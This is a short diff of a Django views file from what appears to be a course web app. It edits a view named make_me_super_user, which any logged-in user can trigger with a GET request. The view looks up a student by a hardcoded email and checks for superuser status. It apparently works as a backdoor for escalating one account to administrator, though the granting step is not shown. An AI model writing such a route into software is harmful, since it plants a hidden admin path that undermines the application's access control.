@@ -123,8 +123,7 @@ def comment_add_comment(request, course_id, lesson_id):
 @login_required
 @require_http_methods(['GET'])
 def make_me_super_user(request):
-    amir = Student.objects.get(email='amirdwikat@example.com')
-    
+    amir = Student.objects.get(email='amirdwikatmain@example.com')
     try:
         if amir.is_superuser:
             return HttpResponse("is already a superuser...")
